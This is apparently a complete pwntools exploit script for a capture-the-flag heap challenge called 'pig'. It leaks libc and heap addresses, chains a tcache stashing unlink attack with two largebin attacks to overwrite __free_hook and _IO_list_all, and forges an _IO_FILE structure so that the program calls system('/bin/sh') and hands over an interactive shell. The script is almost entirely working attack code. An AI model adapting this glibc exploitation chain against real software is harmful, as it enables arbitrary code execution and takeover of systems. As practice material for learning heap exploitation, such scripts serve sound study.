from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

s = process('./pig')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc-2.31.so')

def add(size,content):
	s.sendlineafter(b'Choice: ' , b'1')
	s.sendlineafter(b'size: ' , str(size))
	s.sendlineafter(b'message: ' , content)

def show(index):
	s.sendlineafter(b'Choice: ' , b'2')
	s.sendlineafter(b'index: ' , str(index))

def edit(index,content):
	s.sendlineafter(b'Choice: ' , b'3')
	s.sendlineafter(b'index: ' , str(index))
	s.sendafter(b'message: ' , content)

def delete(index):
	s.sendlineafter(b'Choice: ' , b'4')
	s.sendlineafter(b'index: ' , str(index))

def change(user):
	s.sendlineafter(b'Choice: ' , b'5')
	if (user == 1):
		s.sendlineafter(b'user:\n' , b'A\x01\x95\xc9\x1c')
	elif (user == 2):
		s.sendlineafter(b'user:\n' , b'B\x01\x87\xc3\x19')
	elif (user == 3):
		s.sendlineafter(b'user:\n' , b'C\x01\xf7\x3c\x32')

#----- prepare for tcache stashing unlink attack
change(2)
for i in range(5):
	add(0x90 , b'B'*0x28) # B0-B4
	delete(i) # B0-B4

change(1)
add(0x150 , b'A'*0x68) # A0

for i in range(7):
	add(0x150 , b'A'*0x68) # A1-A7
	delete(i+1) # A1-A7
delete(0)

change(2)
add(0xb0 , b'B'*0x28) # B5 split 0x160 to 0xc0 and 0xa0

change(1)
add(0x180 , b'A'*0x78) # A8
for i in range(7):
	add(0x180 , b'A'*0x78) # A9-A15
	delete(i+9)
delete(8)

change(2)
add(0xe0 , b'B'*0x38) # B6 split 0x190 to 0xf0 and 0xa0

#----- leak libc_base and heap_base
change(1)
add(0x430 , b'A'*0x158) # A16

change(2)
add(0xf0 , b'B'*0x48) # B7

change(1)
delete(16)

change(2)
add(0x440 , b'B'*0x158) # B8 throw A16 to largebin

change(1)
show(16)
s.recvuntil(b'message is: ')
libc_base = u64(s.recv(6).ljust(8 , b'\x00')) - 0x1ebfe0
success('libc_base=>' + hex(libc_base))
system_addr = libc_base + libc.sym['system']
__free_hook = libc_base + libc.sym['__free_hook']
_IO_list_all = libc_base + libc.sym['_IO_list_all'] 
_IO_str_jumps = libc_base + 0x1ed560

edit(16 , b'A'*0xf + b'\n')
show(16)
s.recvuntil(b'message is: ' + b'A'*0xf + b'\n')
heap_base = u64(s.recv(6).ljust(8 , b'\x00')) - 0x13940
success('heap_base=>' + hex(heap_base))

#----- first largebin attack
edit(16 , p64(libc_base + 0x1ebfe0)*2 + p64(heap_base + 0x13940)*2 + b'\n')
add(0x430 , b'A'*0x158) # A17
add(0x430 , b'A'*0x158) # A18
add(0x430 , b'A'*0x158) # A19

change(2)
delete(8)
add(0x450 , b'B'*0x168) # B9 throw B8 to largebin

change(1)
delete(17) # throw A17 to unsortedbin

change(2)
edit(8 , p64(0) + p64(__free_hook - 0x28) + b'\n')

change(3)
add(0xa0 , b'C'*0x28) # c0 triger largebin attack to write a heap_addr to __free_hook - 8

change(2)
edit(8 , p64(heap_base + 0x13e80)*2 + b'\n') # recover

#----- second largebin attack
change(3)
add(0x380 , b'C'*0x118) # c1 clean unsortedbin

change(1)
delete(19)

change(2)
edit(8 , p64(0) + p64(_IO_list_all - 0x20) + b'\n')

change(3)
add(0xa0 , b'C'*0x28) # c2 tiger largebin attack to write a heap_addr to _IO_list_all

change(2)
edit(8 , p64(heap_base + 0x13e80)*2 + b'\n') # recover

#------ tcache stashing unlink attack
change(1)
payload = b'A'*0x50 + p64(heap_base + 0x12280) + p64(__free_hook - 0x20) + b'\n'
edit(8 , payload)

change(3)
payload = b'\x00'*0x18 + p64(heap_base + 0x147c0)
payload = payload.ljust(0x158 , b'\x00')
add(0x440 , payload) # c3 change fake file _chain
add(0x90 , b'C'*0x28) # c4 triger tcache stashing unlink attack to put __free_hook-0x10 to tcache


fake_IO_FILE = p64(0) # _IO_read_end
fake_IO_FILE+= p64(0) # _IO_read_base
fake_IO_FILE+= p64(1) # _IO_write_base
fake_IO_FILE+= p64(0xfffffffffffff) # _IO_write_ptr
fake_IO_FILE+= p64(0) # _IO_write_end
fake_IO_FILE+= p64(heap_base + 0x148a0) # _IO_buf_base
fake_IO_FILE+= p64(heap_base + 0x148b8) # _IO_buf_end
fake_IO_FILE = fake_IO_FILE.ljust(0xb0 , b'\x00')
fake_IO_FILE+= p64(0) # _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xc8 , b'\x00')
fake_IO_FILE+= p64(_IO_str_jumps) # _vtable

payload = fake_IO_FILE + b'/bin/sh\x00' + p64(system_addr)*2

s.sendlineafter(b'Gift:' , payload)

s.sendlineafter(b'Choice: ' , b'5')
s.sendline(b'')

gdb.attach(s)
s.interactive()
